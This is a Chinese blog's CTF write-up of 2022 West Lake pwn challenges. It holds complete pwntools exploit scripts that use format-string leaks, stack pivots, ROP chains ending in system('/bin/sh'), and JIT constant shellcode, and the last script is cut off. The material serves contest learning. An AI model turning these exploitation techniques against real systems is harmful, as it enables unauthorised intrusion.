@@ -1,0 +1,607 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="清風微醺" href="https://www.wdqjxtmph.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="清風微醺" href="https://www.wdqjxtmph.top/atom.xml" />
+<link rel="alternate" type="application/json" title="清風微醺" href="https://www.wdqjxtmph.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="wp" />
+
+
+<link rel="canonical" href="https://www.wdqjxtmph.top/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+
+
+
+  <title>
+2022西湖论剑pwn部分wp - CTF |
+Loτυs = 清風微醺 = 凌恒</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">2022西湖论剑pwn部分wp
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-02-03 21:52:08">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-02-03T21:52:08+08:00">2023-02-03</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>7.2k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>7 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Loτυs</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://pic.imgdb.cn/item/63dd13114757feff3385303d.png">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://www.wdqjxtmph.top/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="Loτυs">
+    <meta itemprop="description" content="凌恒, 凌恒山其若陋兮、">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="清風微醺">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id=""><a class="markdownIt-Anchor" href="#">#</a> </h2>
+<p>挺久没发过博客了，水一篇 (</p>
+<p>和队友一起打到初赛第六，这次属实是没 pwner 什么事，pwn 题难的难，简单的简单，拉不开差距。</p>
+<h1 id="message-board"><a class="markdownIt-Anchor" href="#message-board">#</a> <strong>Message Board</strong></h1>
+<p>程序给了一次格式化字符串，拿来泄露栈地址后栈迁移。</p>
+<p>这里奇怪的是我本地泄露某一个栈地址，在我本机是 glibc 2.31 9.9 的情况以及 patch 过 glibc-all-in-one 中 libc 的情况在远程均无法成功。需要换一个栈地址才行。</p>
+<p>一次性调用程序本身的 call_read gadget + 栈迁移 orw 即可。(更简单的方法是重回 main)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qwq</span>(<span class="params">name</span>):</span></span><br><span class="line">  log.success(<span class="built_in">hex</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">point</span>):</span></span><br><span class="line">  gdb.attach(r,<span class="string">&#x27;b &#x27;</span>+<span class="built_in">str</span>(point))</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/xhlj/Message/pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="number">23566</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/xhlj/Message/pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/xhlj/Message/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(&quot;printf&quot;)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;(%28$p)&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;(&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;)&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x1a0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq(stack_addr)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Now, please say something to DASCTF:&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401413</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004012e0</span></span><br><span class="line">call_read = <span class="number">0x401378</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(stack_addr+<span class="number">0xb0</span>+<span class="number">0x28</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(call_read)</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload+= p64(stack_addr)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\0&#x27;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">open_addr = libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">pop_rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi)+p64(stack_addr+<span class="number">0xd0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_addr)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(elf.bss()+<span class="number">0x800</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(elf.plt[<span class="string">&quot;read&quot;</span>])+p64(pop_rdi)+p64(elf.bss()+<span class="number">0x800</span>)+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">orw = orw.ljust(<span class="number">0xa8</span>,<span class="string">b&#x27;\0&#x27;</span>)+<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">orw+= p64(stack_addr+<span class="number">0x28</span>-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">r.send(orw)</span><br><span class="line"></span><br><span class="line">qwq(libc_base)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="babycalc"><a class="markdownIt-Anchor" href="#babycalc">#</a> babycalc</h1>
+<p><img data-src="https://pic.imgdb.cn/item/63dd13b44757feff3386f325.png" alt=""></p>
+<p>Read buf 的途中可以覆盖掉局部变量 i。因此我们可以做到①负向栈上任意写②正向 v3+0-0xff 偏移内任意更改一字节。</p>
+<p>负向栈上任意写不太有用，我们可以看到同时有一个 off by null 漏洞。</p>
+<p>因此可以考虑改该函数原本返回地址‘nop‘为’leave_ret’。实现栈迁移。</p>
+<p>当然由于 off by null 栈地址不确定性，因此需要爆破，成功概率大概是 1/16。</p>
+<p>同时为了避免重回 main 后第二次又需要爆破导致成功概率变成 1/256，我们尽量一次性提权。</p>
+<p>因此泄露 libc 地址后用 csu 调用 read 函数覆写 got 表，然后调用 system (&quot;/bin/sh&quot;) 提权。</p>
+<p>至于后面的判断条件用 z3 解一解就好了 (甚至可以手算)。</p>
+<p>Libcsearcher 出现了一些问题报错了，远程泄露 puts 真实地址后在 libc.rip 上查询，大概率为 glibc 2.23 11.3 后本地 copy 一份 libc.so.6 直接打就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qwq</span>(<span class="params">name</span>):</span></span><br><span class="line">  log.success(<span class="built_in">hex</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">point</span>):</span></span><br><span class="line">  gdb.attach(r,<span class="string">&#x27;b &#x27;</span>+<span class="built_in">str</span>(point))</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/xhlj/babycalc&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/xhlj/babycalc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/xhlj/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop6_ret = <span class="number">0x400C9A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rdi,rsi,rdx,call_addr</span>):</span></span><br><span class="line">    payload = p64(pop6_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(call_addr)+p64(rdx)+p64(rsi)+p64(rdi)+p64(<span class="number">0x400c80</span>)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">  num = [<span class="number">19</span>,<span class="number">36</span>,<span class="number">53</span>,<span class="number">70</span>,<span class="number">55</span>,<span class="number">66</span>,<span class="number">17</span>,<span class="number">161</span>,<span class="number">50</span>,<span class="number">131</span>,<span class="number">212</span>,<span class="number">101</span>,<span class="number">118</span>,<span class="number">199</span>,<span class="number">24</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  pop_rdi = <span class="number">0x0000000000400ca3</span></span><br><span class="line">  <span class="comment"># debug(&quot;* 0x400C18&quot;)</span></span><br><span class="line">  rop_chain=[</span><br><span class="line">    pop_rdi,</span><br><span class="line">    elf.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">    elf.plt[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">    csu(<span class="number">0</span>,elf.got[<span class="string">&quot;puts&quot;</span>],<span class="number">0x30</span>,elf.got[<span class="string">&quot;read&quot;</span>]),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    elf.got[<span class="string">&quot;puts&quot;</span>]+<span class="number">8</span>,</span><br><span class="line">    elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">  ]</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(flat(rop_chain))))</span><br><span class="line">  payload = <span class="built_in">str</span>(<span class="number">0x18</span>).encode().ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">  payload+=p64(pop_rdi+<span class="number">1</span>)*<span class="number">4</span></span><br><span class="line">  rop_chain_size = <span class="built_in">len</span>(flat(rop_chain))</span><br><span class="line">  payload+= flat(rop_chain)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    payload+=p8(num[i])</span><br><span class="line">  payload = payload.ljust(<span class="number">0xfc</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">  r.recvuntil(<span class="string">b&#x27;number&#x27;</span>)</span><br><span class="line">  r.send(payload)</span><br><span class="line"></span><br><span class="line">  puts_addr=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">  pause()</span><br><span class="line">  libc_base = puts_addr-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">  system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">  r.sendline(p64(system_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  qwq(libc_base)</span><br><span class="line">  r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  r = remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="number">25351</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/xhlj/babycalc&#x27;)</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      pwn()</span><br><span class="line">  <span class="keyword">except</span> EOFError:</span><br><span class="line">      r.close()</span><br><span class="line">      <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<h1 id="jit"><a class="markdownIt-Anchor" href="#jit">#</a> Jit</h1>
+<p>经 <code>ln3</code>  师傅同意收录其 wp 如下。</p>
+<h2 id="基本逻辑"><a class="markdownIt-Anchor" href="#基本逻辑">#</a> 基本逻辑</h2>
+<p><img data-src="https://pic.imgdb.cn/item/63dd23964757feff33a7ce56.png" alt=""></p>
+<p>输入字节码，存储到 IRstream string 中</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd22234757feff33a3d405.png" alt=""></p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd223d4757feff33a41dcb.png" alt=""></p>
+<p>向可执行段写入起始汇编代码，内容如注释</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd224b4757feff33a4550c.png" alt=""></p>
+<p>为每个函数生成汇编</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd22574757feff33a486a7.png" alt=""></p>
+<p>一个函数字节码 header 结构为 0xff | id | argcnt | localcnt, 共 4 字节</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd22674757feff33a4c985.png" alt=""></p>
+<p>将函数信息以 id 为 key 放入 map 中，并向可执行段中写入 sub rsp,xx 的机器码，xx 由 localcnt 决定</p>
+<p>随后进入生成汇编函数体和 return 相关语句的逻辑</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd22774757feff33a4ffdf.png" alt=""></p>
+<p>主要是循环根据字节码派发生成汇编</p>
+<p>变量分为局部变量跟参数，索引从 1 起始</p>
+<p>其栈帧构造大致如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">        |--------|</span><br><span class="line">rsp --&gt; | localB |</span><br><span class="line">        |--------|</span><br><span class="line">        | localA |</span><br><span class="line">		|--------|</span><br><span class="line">rbp --&gt; |retaddr |</span><br><span class="line">        |--------|</span><br><span class="line">        |  arg1  |</span><br><span class="line">        |--------|</span><br><span class="line">		|  arg2  |</span><br><span class="line">        |--------|</span><br><span class="line">        |  arg3  |</span><br><span class="line">		|--------|</span><br><span class="line">		| oldrbp |</span><br><span class="line">        |--------|</span><br></pre></td></tr></table></figure>
+<p>对变量的引用模式如下</p>
+<p>var2idx 将 var 的索引转为在栈中的偏移量</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd22964757feff33a5646e.png" alt=""></p>
+<p>pvar2reg 通过 lea 指令将偏移量转化成地址存入 rdi</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd21fd4757feff33a37a9b.png" alt=""></p>
+<p>var2reg 调用 pvar2reg 之后通过解索引获取变量的值存入 rsi</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd22bd4757feff33a5b205.png" alt=""></p>
+<p>其他操作较容易理解不再赘述</p>
+<h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析">#</a> 漏洞分析</h2>
+<p>经过一些测试分析发现生成的指令较为紧凑，无法拼接指令</p>
+<p>所以转而分析实现复杂一些的 call 指令</p>
+<p>这个 call 指令实现的有很多 bug</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd22f04757feff33a66c58.png" alt=""></p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd23044757feff33a6bacc.png" alt=""></p>
+<p>首先可以看到一个比较特殊的点是 push rbp, 这说明在这个 jit 中是父函数为子函数新建栈帧，调整 rsp, 分配栈空间</p>
+<p>然后将存在 vector 中的参数索引取出转化为值存入栈</p>
+<p>但是明显注意到，在函数末尾，并没有把参数占用栈空间回收，同时在将参数存入栈时，使用的偏移量均为负数，</p>
+<p>与我们刚刚总结出的栈布局矛盾，令人疑惑</p>
+<p>我们查看函数的返回实现</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd23174757feff33a70687.png" alt=""></p>
+<p>显然只考虑回收了函数的局部变量，并没有回收参数部分</p>
+<p>这导致父函数的栈不平衡，在父函数返回时 add rsp,xx 不能复位到正确的位置，会落到局部变量中，使得可以劫持控制流</p>
+<p>另外，在填充 call 指令时，也有一个 bug</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd23264757feff33a71f59.png" alt=""></p>
+<p>call 指令长度有 5 字节，1 字节 0xe8 的操作码与 4 字节的跳转位置相对偏移，这里偏移以 call 指令的下一条指令为起始地址来计算</p>
+<p>write 写入时会修改 exec_wr 指针，向后移动，所以此时 exec_wr 并不指向 call 指令开头，而是后移了一字节</p>
+<p>所以此时 call 指令下一条指令地址应为 exec_wr+4, 这里的代码为 exec_wr+5, 这导致 call 的目的地实际向上偏移了一字节</p>
+<p>不幸的是以上两个 bug 均无法利用</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd23264757feff33a71f59.png" alt=""></p>
+<p>在这里的判断逻辑</p>
+<p>要求了必须要存在一个 id 为 0 的函数，且函数不能具有参数，同时一定要生成在初始汇编代码之后</p>
+<p>而此时其他函数都尚未载入，对于 0 id 函数来说都不可见，同时其自身不含参数，无法调用自身触发 call 指令关于参数的漏洞</p>
+<p>笔者花了很多时间思考如何去绕过这种限制，无果</p>
+<p>而后决定仔细审计考察一遍 id 0 函数能够执行的命令，希望能够找到一些线索</p>
+<p>然后发现了预期的漏洞</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd24ef4757feff33aa4719.png" alt=""></p>
+<p>根据我们刚才的栈布局图可知当 var2idx 的参数为 0 是索引到的应该为函数返回值，所以这里在开头即检查了变量是否为 0</p>
+<p>但是在 locals 的分支这里却存在为 0 的可能性</p>
+<p><img data-src="https://pic.imgdb.cn/item/63dd25094757feff33aa6c52.png" alt=""></p>
+<p>一个函数最多能拥有 32 个局部变量，32 * 8 = 0x100, 会在向 char 类型转换时变为 0</p>
+<p>这意味这我们可以直接引用函数的返回地址，随意存取修改</p>
+<h2 id="利用手法"><a class="markdownIt-Anchor" href="#利用手法">#</a> 利用手法</h2>
+<p>利用手法是经典的 jit 利用，与 ciscn 2022 的 llvm pass pwn 相似，主要利用汇编中的常数来作为汇编代码执行，并通过 jmp 来连接</p>
+<p>程序提供了一个 movabs rsi, xxx, 可以有 8 字节的数据，其中有 2 字节用来 jmp 到下一段 shellcode</p>
+<p>具体见 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_func</span>(<span class="params"><span class="built_in">id</span>,arg_cnt,local_cnt</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    hdr = <span class="string">b&#x27;\xff&#x27;</span> + p8(<span class="built_in">id</span>) + p8(arg_cnt) + p8(local_cnt)</span><br><span class="line">    payload += hdr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_var_imm</span>(<span class="params">vidx,imm</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">1</span>)</span><br><span class="line">    payload += p8(vidx | <span class="number">0x80</span>)</span><br><span class="line">    payload += p64(imm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callf</span>(<span class="params">fid,retvar,arg_cnt,args=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">6</span>)</span><br><span class="line">    payload += p8(fid)</span><br><span class="line">    payload += p8(retvar)</span><br><span class="line">    payload += p8(arg_cnt)</span><br><span class="line">    <span class="keyword">if</span> arg_cnt != <span 